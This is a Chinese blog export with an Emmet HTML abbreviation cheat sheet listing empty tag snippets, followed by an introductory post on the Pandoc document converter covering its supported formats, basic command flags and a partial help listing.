<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr class=&quot;row&quot;&gt;</span><br><span class="line">        &lt;td class=&quot;col&quot;&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p><em>所有未知的缩写都会转换成标签，例如，foo → &lt;foo&gt;&lt;&#x2F;foo&gt;</em></p>
<p><strong>缩写</strong>：!</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：a</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：a:link</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;http://&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：a:mail</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&quot;mailto:&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：abbr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;abbr title=&quot;&quot;&gt;&lt;/abbr&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：acronym</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;acronym title=&quot;&quot;&gt;&lt;/acronym&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：base</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;base href=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：basefont</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;basefont /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：br</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：frame</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;frame /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：hr</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;hr /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：bdo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bdo dir=&quot;&quot;&gt;&lt;/bdo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：bdo:r</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bdo dir=&quot;rtl&quot;&gt;&lt;/bdo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：bdo:l</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;bdo dir=&quot;ltr&quot;&gt;&lt;/bdo&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：col</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;col /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:print</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;print.css&quot; media=&quot;print&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:favicon</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;shortcut icon&quot; type=&quot;image/x-icon&quot; href=&quot;favicon.ico&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:touch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;apple-touch-icon&quot; href=&quot;favicon.png&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:rss</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;RSS&quot; href=&quot;rss.xml&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：link:atom</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;alternate&quot; type=&quot;application/atom+xml&quot; title=&quot;Atom&quot; href=&quot;atom.xml&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：meta</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：meta:utf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：meta:win</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=windows-1251&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：meta:vp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：meta:compat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=7&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：style</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：script</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：script:src</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：img</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：iframe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：embed</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;embed src=&quot;&quot; type=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：object</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;&quot; type=&quot;&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：param</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;param name=&quot;&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：map</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map name=&quot;&quot;&gt;&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：area</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：area:d</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;area shape=&quot;default&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：area:c</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;area shape=&quot;circle&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：area:r</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;area shape=&quot;rect&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：area:p</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;area shape=&quot;poly&quot; coords=&quot;&quot; href=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：form</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：form:get</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：form:post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：label</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;label for=&quot;&quot;&gt;&lt;/label&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：inp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:hidden</p>
<p><em>别名：input[type&#x3D;hidden name]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:h</p>
<p><em>别名：input:hidden</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:text, input:t</p>
<p><em>别名：inp</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:search</p>
<p><em>别名：inp[type&#x3D;search]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;search&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:email</p>
<p><em>别名：inp[type&#x3D;email]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;email&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:url</p>
<p><em>别名：inp[type&#x3D;url]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;url&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:password</p>
<p><em>别名：inp[type&#x3D;password]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;password&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:p</p>
<p><em>别名：input:password</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;password&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:datetime</p>
<p><em>别名：inp[type&#x3D;datetime]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;datetime&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:date</p>
<p><em>别名：inp[type&#x3D;date]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;date&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:datetime-local</p>
<p><em>别名：inp[type&#x3D;datetime-local]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;datetime-local&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:month</p>
<p><em>别名：inp[type&#x3D;month]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;month&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:week</p>
<p><em>别名：inp[type&#x3D;week]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;week&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:time</p>
<p><em>别名：inp[type&#x3D;time]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;time&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:number</p>
<p><em>别名：inp[type&#x3D;number]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;number&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:color</p>
<p><em>别名：inp[type&#x3D;color]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;color&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:checkbox</p>
<p><em>别名：inp[type&#x3D;checkbox]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:c</p>
<p><em>别名：input:checkbox</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;checkbox&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:radio</p>
<p><em>别名：inp[type&#x3D;radio]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;radio&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:r</p>
<p><em>别名：input:radio</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;radio&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:range</p>
<p><em>别名：inp[type&#x3D;range]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;range&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:file</p>
<p><em>别名：inp[type&#x3D;file]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:f</p>
<p><em>别名：input:file</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:submit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:s</p>
<p><em>别名：input:submit</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:image</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;image&quot; src=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:i</p>
<p><em>别名：input:image</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;image&quot; src=&quot;&quot; alt=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:button</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:b</p>
<p><em>别名：input:button</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;button&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：isindex</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;isindex /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：input:reset</p>
<p><em>别名：input:button[type&#x3D;reset]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;reset&quot; value=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：select</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;select name=&quot;&quot; id=&quot;&quot;&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：option</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;option value=&quot;&quot;&gt;&lt;/option&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：textarea</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：menu:context</p>
<p><em>别名：menu[type&#x3D;context]&gt;</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;menu type=&quot;context&quot;&gt;&lt;/menu&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：menu:c</p>
<p><em>别名：menu:context</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;menu type=&quot;context&quot;&gt;&lt;/menu&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：menu:toolbar</p>
<p><em>别名：menu[type&#x3D;toolbar]&gt;</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;menu type=&quot;toolbar&quot;&gt;&lt;/menu&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：menu:t</p>
<p><em>别名：menu:toolbar</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;menu type=&quot;toolbar&quot;&gt;&lt;/menu&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：video</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;video src=&quot;&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：audio</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;audio src=&quot;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：html:xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：keygen</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;keygen /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：command</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;command /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：bq</p>
<p><em>别名：blockquote</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;blockquote&gt;&lt;/blockquote&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：acr</p>
<p><em>别名：acronym</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;acronym title=&quot;&quot;&gt;&lt;/acronym&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：fig</p>
<p><em>别名：figure</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;figure&gt;&lt;/figure&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：figc</p>
<p><em>别名：figcaption</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;figcaption&gt;&lt;/figcaption&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：ifr</p>
<p><em>别名：iframe</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：emb</p>
<p><em>别名：embed</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;embed src=&quot;&quot; type=&quot;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：obj</p>
<p><em>别名：object</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;object data=&quot;&quot; type=&quot;&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：src</p>
<p><em>别名：source</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;source&gt;&lt;/source&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：cap</p>
<p><em>别名：caption</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;caption&gt;&lt;/caption&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：colg</p>
<p><em>别名：colgroup</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;colgroup&gt;&lt;/colgroup&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：fst, fset</p>
<p><em>别名：fieldset</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;fieldset&gt;&lt;/fieldset&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：btn</p>
<p><em>别名：button</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：btn:b</p>
<p><em>别名：button[type&#x3D;button]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;button&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：btn:r</p>
<p><em>别名：button[type&#x3D;reset]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;reset&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>

<p><strong>缩写</strong>：btn:s</p>
<p><em>别名：button[type&#x3D;submit]</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button type=&quot;submit&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>神器</tag>
        <tag>Emmet</tag>
      </tags>
  </entry>
  <entry>
    <title>文档转换神器Pandoc</title>
    <url>/blog/tools/pandoc/base/</url>
    <content><![CDATA[<p>Pandoc是由John MacFarlane开发的标记语言转换工具，可实现不同标记语言间的格式转换，堪称该领域中的“瑞士军刀”。</p>
<p>Pandoc使用Haskell语言编写，以命令行形式实现与用户的交互，可支持多种操作系统；Pandoc采用GNU GPL授权协议发布，属于自由软件。</p>
<p>网站：</p>
<p><a href="http://www.pandoc.org/">http://www.pandoc.org/</a></p>
<h2 id="处理文件类型"><a href="#处理文件类型" class="headerlink" title="处理文件类型"></a>处理文件类型</h2><p>输入文件类型：</p>
<p>markdown, reStructuredText, textile, HTML, DocBook, LaTeX, MediaWiki markup, TWiki markup, OPML, Emacs Org-Mode, Txt2Tags, Microsoft Word docx, LibreOffice ODT, EPUB, Haddock markup</p>
<p>输出文件类型：</p>
<p>HTML formats: XHTML, HTML5, and HTML slide shows using Slidy, reveal.js, Slideous, S5, or DZSlides.</p>
<p>Word formats: Microsoft Word docx, OpenOffice&#x2F;LibreOffice ODT, OpenDocument XML</p>
<p>Ebooks: EPUB version 2 or 3, FictionBook2</p>
<p>Documentation formats: DocBook, TEI Simple, GNU TexInfo, Groff man pages, Haddock markup<br>Page layout formats: InDesign ICML</p>
<p>Outline formats: OPML</p>
<p>TeX formats: LaTeX, ConTeXt, LaTeX Beamer slides</p>
<p>PDF via LaTeX</p>
<p>Lightweight markup formats: Markdown (including CommonMark), reStructuredText, AsciiDoc, MediaWiki markup, DokuWiki markup, Emacs Org-Mode, Textile</p>
<p>Custom formats: custom writers can be written in lua.</p>
<h2 id="pandoc命令"><a href="#pandoc命令" class="headerlink" title="pandoc命令"></a>pandoc命令</h2><p>读取文件（源文件）的格式</p>
<pre><code>-f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT
</code></pre>
<p>写入文件（目标文件的）格式</p>
<pre><code>-t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT
</code></pre>
<p>输出文件（目标文件）的文件名</p>
<pre><code>-o FILENAME           --output=FILENAME
</code></pre>
<p>把demo.md输出成demo.html</p>
<pre><code>pandoc -f markdown -t html -o demo.html demo.md
</code></pre>
<h2 id="pandoc命令帮助"><a href="#pandoc命令帮助" class="headerlink" title="pandoc命令帮助"></a>pandoc命令帮助</h2><pre><code>pandoc [OPTIONS] [FILES]
  -f FORMAT, -r FORMAT  --from=FORMAT, --read=FORMAT                    
  -t FORMAT, -w FORMAT  --to=FORMAT, --write=FORMAT                     
  -o FILENAME           --output=FILENAME                               
                        --data-dir=DIRECTORY                            
  -R                    --parse-raw                                     
  -S                    --smart                                         
                        --old-dashes                                    
                        --base-header-level=NUMBER                      
                        --indented-code-classes=STRING                  
  -F PROGRAM            --filter=PROGRAM                                
                        --normalize                                     
  -p                    --preserve-tabs                                 
                        --tab-stop=NUMBER                               
                        --track-changes=accept|reject|all               
                        --file-scope                                    
                        --extract-media=PATH                            
  -s                    --standalone                                    
                        --template=FILENAME                             
  -M KEY[:VALUE]        --metadata=KEY[:VALUE]                          
  -V KEY[:VALUE]        --variable=KEY[:VALUE]                          
  -D FORMAT             --print-default-template=FORMAT                 
                        --print-default-data-file=FILE                  
                        --dpi=NUMBER                                    
                        --no-wrap                                       
                        --wrap=[auto|none|preserve]                     
                        --columns=NUMBER                                
                        --toc, --table-of-contents                      
                        --toc-depth=NUMBER                              
                        --no-highlight                                  
                        --highlight-style=STYLE                         
  -H FILENAME           --include-in-header=FILENAME                    
  -B FILENAME           --include-before-body=FILENAME                  
  -A FILENAME           --include-after-body=FILENAME                   
                        --self-contained                                
                        --html-q-tags                                   
                        --ascii                                         
                        --reference-links                               
                        --reference-location=block|section|document     
                        --atx-headers                                   
                        --chapters                                      
                        --top-level-division=[section|chapter|part]     
  -N                    --number-sections                               
                        --number-offset=NUMBERS                         
                        --no-tex-ligatures                              
                        --listings                                      
  -i                    --incremental                                   
                        --slide-level=NUMBER                            
                        --section-divs                                  
                        --default-image-extension=extension             
                        --email-obfuscation=none|javascript|references  
                        --id-prefix=STRING                              
